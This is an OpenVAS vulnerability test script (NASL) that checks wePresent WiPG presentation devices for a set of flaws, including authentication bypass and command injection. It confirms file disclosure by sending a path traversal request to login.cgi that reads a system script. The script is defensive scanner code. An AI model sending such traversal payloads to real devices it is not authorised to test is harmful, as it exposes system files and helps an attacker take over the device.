###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wepresent_wipg_mult_vuln.nasl 12260 2018-11-08 12:46:52Z cfischer $
#
# wePresent WiPG Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:wepresent:wipg';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106782");
  script_version("$Revision: 12260 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-08 13:46:52 +0100 (Thu, 08 Nov 2018) $");
  script_tag(name:"creation_date", value:"2017-04-21 08:12:54 +0200 (Fri, 21 Apr 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("wePresent WiPG Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wepresent_wipg_detect.nasl");
  script_mandatory_keys("wepresent_wipg/model");

  script_tag(name:"summary", value:"wePresent WiPG devices are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP request and checks the response.");

  script_tag(name:"insight", value:"wePresent WiPG devices are prone to multiple vulnerabilities:

  - Web-UI authentication bypasses

  - Web-UI privilege escalation

  - OS command injection

  - Arbitrary file disclosure

  - File inclusion

  - Insecure maintenance interface");

  script_tag(name:"impact", value:"A unauthenticed attacker may gain complete control over the device.");

  script_tag(name:"affected", value:"wePresent WiPG-1000, WiPG-1500 and WiPG-2000 devices.");

  script_tag(name:"solution", value:"Upgrade to firmware version 2.2.3.0 or later.");

  script_xref(name:"URL", value:"https://www.redguard.ch/advisories/wepresent-wipg1000.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

url = '/cgi-bin/login.cgi?lang=en&src=../../../bin/mountstor.sh';

if (http_vuln_check(port: port, url: url, pattern: "^LOGFILE=", check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
